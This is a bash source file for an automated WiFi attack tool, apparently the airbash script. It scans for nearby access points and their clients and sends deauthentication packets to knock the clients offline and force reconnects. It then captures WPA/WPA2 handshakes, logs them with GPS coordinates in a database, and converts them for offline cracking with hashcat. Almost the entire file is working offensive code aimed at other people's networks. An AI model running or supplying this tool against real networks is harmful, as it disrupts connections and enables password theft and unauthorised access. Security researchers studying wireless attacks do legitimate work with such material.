# This is the airbash main script (https://github.com/tehw0lf/airbash)
# Written by tehw0lf
# This script is an automated WPA/WPA2 handshake collector which uses
# software from https://aircrack-ng.org. First, the script will scan for
# WiFi clients that are connected to access points. Then, each client receives
# a deauthentication packet that should terminate its connection to the
# access point, thus forcing a reconnect. In order to capture the handshake,
# airodump is being run after sending the deauthentication packet. Verification
# of a captured handshake is done using aircrack-ng

airocheck() {
  # checks a handshake (passed by file name) using aircrack-ng
  # returns 1 on success and 0 on failure
  for s in $(ls "$1"*.cap 2>/dev/null); do
    if [ $("$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl"known.txt 2>/dev/null | grep -c valid) -eq 0 ]; then
      airstrtmp=$("$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl"known.txt 2>/dev/null | grep handshake)
      numhs=$(echo "$airstrtmp" | awk '{print $5}')
      if [ "$numhs" == "(0" ]; then
        cs=0
      else
        cs=1
      fi
    fi
  done
}
airekill() {
  # kill all instances of aireplay-ng to prevent locking
  for pid in $(pgrep $(basename "$AIREPLAY_BIN")); do
    { kill $pid && wait $pid; } &>/dev/null
  done
}
airokill() {
  # kill all instances of airodump-ng to prevent locking
  for pid in $(pgrep $(basename "$AIRODUMP_BIN")); do
    { kill $pid && wait $pid; } &>/dev/null
  done
}

# enviro stuff
WDIR=$(realpath .)
INTERFACE="wlan0"
AIRCRACK_BIN=$(which aircrack-ng)
AIRODUMP_BIN=$(which airodump-ng)
AIREPLAY_BIN=$(which aireplay-ng)
SQLITE3_BIN=$(which sqlite3)
HC2HCX_BIN=$(which wlanhc2hcx)

if [ -z "$AIRCRACK_BIN" ]; then
  echo "Make sure aircrack-ng is in your path!"
  exit
fi
if [ -z "$AIRODUMP_BIN" ]; then
  echo "Make sure airodump-ng is in your path!"
  exit
fi
if [ -z "$AIREPLAY_BIN" ]; then
  echo "Make sure aireplay-ng is in your path!"
  exit
fi
if [ -z "$SQLITE3_BIN" ]; then
  echo "Make sure sqlite3 is in your path!"
  exit
fi
if [ -z "HC2HCX_BIN" ]; then
  echo -e "Make sure the path to hcxtools' wlanhc2hcx is correct!\nhttps://github.com/ZerBea/hcxtools/blob/master/wlanhc2hcx.c"
  exit
fi

# configure path variables
path="$WDIR/"
db=".db.sqlite3"
bl=".bl"
hs=".hs/"
loc=".loc/"
wl=".wl/"
ofile="initlist"
init="initlist-01.csv"

# create nonexisting paths and files
mkdir "$path$hs" &>/dev/null
touch "$path$bl"
airokill

# clean up previous files (and .tar backups if present)
rm -f "$path"initlist &>/dev/null
rm -f "$path"*.csv &>/dev/null
rm -f "$path"*.cap &>/dev/null

# initial 20 second scan to determine targets
{ "$AIRODUMP_BIN" -w $path$ofile -o csv $INTERFACE &>/dev/null; } &
sleep 20
airokill
ctr=1
$(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' >"$path"ninitfile)
ninit=$(wc -l <"$path"ninitfile)
rm -f "$path"ninitfile
# level 1: access points (scan and apply filters)
for i in $(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'); do
  c=$(tr -d ' ' < $path$init 2>/dev/null | grep $i | awk -F ',' 'NR==1{print $4}')
  echo "_$ctr/$ninit    "
  { "$AIRODUMP_BIN" -c $c --bssid $i -w $path$i -o pcap $INTERFACE &>/dev/null; } &
  sleep 2
  if [ $(grep -c $i "$path$bl" 2>/dev/null) -gt 0 ]; then
    # blacklisted access point
    echo "-         "
    airokill
    ctr=$((ctr + 1))
    continue
  fi
  if [ $("$SQLITE3_BIN" "$path$db" "SELECT * FROM hs WHERE bssid='$i'" 2>/dev/null | grep -c $i) -gt 0 ]; then
    # handshake for access point present in database
    echo "x         "
    airokill
    ctr=$((ctr + 1))
    continue
  fi
  if [ $(ls "$path$i"*.cap 2>/dev/null | grep -c cap) -eq 0 ]; then
    # access point is not reachable anymore
    echo "?         "
    airokill
    ctr=$((ctr + 1))
    continue
  fi
  ctr2=1
  $(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' >"$path"nairofile)
  nairo=$(wc -l <"$path"nairofile)
  rm -f "$path"nairofile
  # level 2: deauthenticate clients and try to capture handshake
  for j in $(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'); do
    curbssid=$(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $j | grep $i | awk -F ',' '{print $6}')
    if [ "$curbssid" == "$i" ]; then
      echo "__$ctr2/$nairo    "
      # send a single deauth packet
      { "$AIREPLAY_BIN" -0 1 -a $i -c $j -F $INTERFACE &>/dev/null; } &
      sleep 5
      cs=0
      airocheck "$path$i"
      if [ $cs -eq 1 ]; then
        airekill
        break
      fi
      airekill
      ctr2=$((ctr2 + 1))
    else
      ctr2=$((ctr2 + 1))
    fi
  done
  sleep 5
  airokill
  ctr=$((ctr + 1))
done
rm -f "$path"initlist*
ctr3=0
# finalize by inserting data for captured handshakes into database
# and converting the .pcap to a .hccapx file for use with hashcat
for h in $(ls "$path"*.cap 2>/dev/null); do
  if [ $("$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep -c valid) -eq 0 ]; then
    airstr=$("$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep handshake)
    getloc=$(sed '2q;d' "$path$loc"*.txt 2>/dev/null)
    if [ $(echo "$airstr" | awk '{print $5}') == "(0" ]; then
      rm -f "$h"
    else
      b=$(echo "$airstr" | awk '{print $2}')
      e=$(echo "$airstr" | awk '{for (F=3;F<=NF-3;++F) printf " %s", ($F)}')
      e=${e:1:${#e}}
      lat=$(echo "$getloc" | awk -F ',' '{print $2}')
      lon=$(echo "$getloc" | awk -F ',' '{print $3}')
      "$SQLITE3_BIN" "$path$db" "INSERT INTO hs(lat, lon, bssid, essid) VALUES('$lat', '$lon', '$b', '$e');" 2>/dev/null
      "$AIRCRACK_BIN" "$h" -J "$h" &>/dev/null
      "$HC2HCX_BIN" -o "$path$hs$b".hccapx "$h".hccap &>/dev/null
      mv "$h" "$path$hs"
      rm -f "$h".hccap
      ctr3=$((ctr3 + 1))
    fi
  else
    rm -f "$h"
  fi
done
echo "_______"
echo "$ctr3!"
